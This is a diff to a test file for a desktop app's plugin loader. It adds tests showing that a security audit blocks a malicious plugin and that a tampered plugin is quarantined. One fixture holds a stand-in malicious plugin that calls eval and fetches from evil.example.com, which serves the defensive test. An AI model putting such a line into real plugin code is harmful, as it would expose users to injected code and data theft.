@@ -24,7 +24,7 @@ describe('desktop dynamic-loader', () => {
   it('discovers workspace plugins dynamically without codegen', async () => {
     const registry = getBuiltinPluginRegistry()
     const keys = Object.keys(registry)
-    expect(keys.length).toBe(59)
+    expect(keys.length).toBe(60)
 
     // Check a representative plugin
     const playerEntry = registry['@BBeBee/plugin-player']
@@ -38,7 +38,7 @@ describe('desktop dynamic-loader', () => {
     expect(playerModule.default ?? playerModule).toBeDefined()
 
     // Also verify exported bundled registry matches
-    expect(Object.keys(bundled).length).toBe(59)
+    expect(Object.keys(bundled).length).toBe(60)
   })
 
   it('scans and builds dynamic registry entries from installed plugins', async () => {
@@ -156,6 +156,99 @@ describe('desktop dynamic-loader', () => {
     expect(order).toEqual(['fiber-unloaded', 'disk-removed'])
     expect(mockApp.unloadPlugin).toHaveBeenCalledWith('sample-ext')
     expect(uninstallMock).toHaveBeenCalledWith('sample-ext')
+
+    window.BBeBee = original
+  })
+
+  it('blocks installation when security audit detects malicious code', async () => {
+    const original = window.BBeBee
+    const installMock = vi.fn()
+    // @ts-expect-error test mock
+    window.BBeBee = {
+      ...original,
+      plugins: {
+        listInstalled: vi.fn(),
+        install: installMock,
+        uninstall: vi.fn(),
+      },
+    }
+
+    const mockApp: Partial<App> = {
+      registerPlugin: vi.fn(),
+      loadPlugin: vi.fn(),
+    }
+
+    const manifest: PluginManifest = {
+      id: 'malicious-ext',
+      version: '1.0.0',
+      displayName: 'Malicious Ext',
+      engines: { BBeBee: '^0.1.0' },
+      entry: { main: './index.js' },
+      capabilities: [],
+    }
+
+    const files = {
+      'index.js': 'eval("badCode()"); fetch("https://evil.example.com");',
+      'manifest.json': JSON.stringify(manifest),
+    }
+
+    await expect(
+      installAndActivatePlugin(mockApp as App, 'malicious-ext', files, manifest),
+    ).rejects.toThrow(/Installation blocked by security audit/)
+
+    expect(installMock).not.toHaveBeenCalled()
+    expect(mockApp.registerPlugin).not.toHaveBeenCalled()
+
+    window.BBeBee = original
+  })
+
+  it('refuses loading and marks quarantined when installed plugin hash is tampered', async () => {
+    const original = window.BBeBee
+    const listInstalledMock = vi.fn().mockResolvedValue([
+      {
+        id: '@test/tampered-plugin',
+        version: '1.0.0',
+        manifest: {
+          id: '@test/tampered-plugin',
+          version: '1.0.0',
+          displayName: 'Tampered Plugin',
+          entry: { main: './index.js' },
+          capabilities: [],
+        },
+        dirName: 'test_tampered',
+        sha256: 'tampered-sha-256',
+      },
+    ])
+
+    // @ts-expect-error test mock
+    window.BBeBee = {
+      ...original,
+      plugins: {
+        listInstalled: listInstalledMock,
+        install: vi.fn(),
+        uninstall: vi.fn(),
+      },
+    }
+
+    const lock = {
+      version: 1 as const,
+      records: {
+        '@test/tampered-plugin': {
+          id: '@test/tampered-plugin',
+          kind: 'plugin' as const,
+          repo: 'https://github.com/test/tampered-plugin',
+          commit: 'c0ffee1',
+          sha256: 'original-sha-256',
+          installedAt: 123456789,
+        },
+      },
+    }
+
+    const registry = await loadExternalPluginRegistry({ lock })
+    expect(registry['@test/tampered-plugin']).toBeDefined()
+    const entry = registry['@test/tampered-plugin']!
+    expect(entry.quarantined).toBe(true)
+    await expect(entry.load!()).rejects.toThrow(/tampered/)
 
     window.BBeBee = original
   })
